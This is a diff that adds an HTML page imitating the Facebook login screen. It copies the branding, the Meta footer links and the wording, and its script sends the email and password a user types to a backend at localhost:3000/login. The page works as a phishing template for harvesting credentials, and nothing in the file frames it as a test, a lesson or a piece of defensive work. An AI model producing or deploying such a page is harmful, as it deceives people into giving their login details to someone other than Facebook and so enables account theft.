@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="Icon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="text-center">
+        <h1 class="text-4xl font-bold text-blue-700 mb-7">facebook</h1>
+        <div class="bg-white p-7 rounded-lg shadow-lg max-w-sm w-full">
+            <h2 class="text-xl font-medium mb-5">Log in to Facebook</h2>
+            <form id="loginForm">
+                <div class="mb-4">
+                    <input type="text" id="email" placeholder="Email address or phone number"
+                        class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
+                        required>
+                </div>
+                <div class="mb-4">
+                    <input type="password" id="password" placeholder="Password"
+                        class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
+                        required>
+                </div>
+                <button type="submit"
+                    class="w-full bg-blue-600 text-white p-3 rounded-lg font-medium hover:bg-blue-700">Log in</button>
+            </form>
+            <div class="mt-4">
+                <a href="#" class="text-blue-600 text-sm">Forgotten account?</a> · <a href="#"
+                    class="text-blue-600 text-sm">Sign up for Facebook</a>
+            </div>
+        </div>
+    </div>
+    <footer class="absolute bottom-0 w-full bg-white py-4">
+        <div class="text-center text-gray-500 text-sm">
+            <div class="mb-2">
+                <a href="#" class="mx-1">English (UK)</a>
+                <a href="#" class="mx-1">தமிழ்</a>
+                <a href="#" class="mx-1">తెలుగు</a>
+                <a href="#" class="mx-1">ಕನ್ನಡ</a>
+                <a href="#" class="mx-1">اردو</a>
+                <a href="#" class="mx-1">हिन्दी</a>
+                <a href="#" class="mx-1">മലയാളം</a>
+                <a href="#" class="mx-1">සිංහල</a>
+                <a href="#" class="mx-1">ਪੰਜਾਬੀ</a>
+                <a href="#" class="mx-1">বাংলা</a>
+                <a href="#" class="mx-1">ગુજરાતી</a>
+                <a href="#" class="mx-1">+</a>
+            </div>
+            <div>
+                <a href="#" class="mx-1">Sign Up</a>
+                <a href="#" class="mx-1">Log in</a>
+                <a href="#" class="mx-1">Messenger</a>
+                <a href="#" class="mx-1">Facebook Lite</a>
+                <a href="#" class="mx-1">Video</a>
+                <a href="#" class="mx-1">Places</a>
+                <a href="#" class="mx-1">Games</a>
+                <a href="#" class="mx-1">Marketplace</a>
+                <a href="#" class="mx-1">Meta Pay</a>
+                <a href="#" class="mx-1">Meta Store</a>
+                <a href="#" class="mx-1">Meta Quest</a>
+                <a href="#" class="mx-1">Ray-Ban</a>
+                <a href="#" class="mx-1">Meta</a>
+                <a href="#" class="mx-1">Meta AI</a>
+            </div>
+            <div>
+                Meta © 2024
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Get form and input elements
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Get user input values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Send data to the backend using a POST request
+                const response = await fetch('http://localhost:3000/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password }),
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    alert(result.message); // Notify the user of success
+                } else {
+                    alert(result.error); // Notify the user of an error
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Something went wrong. Please try again.');
+            }
+
+            // Clear the input fields
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        });
+    </script>
+</body>
+
+</html>
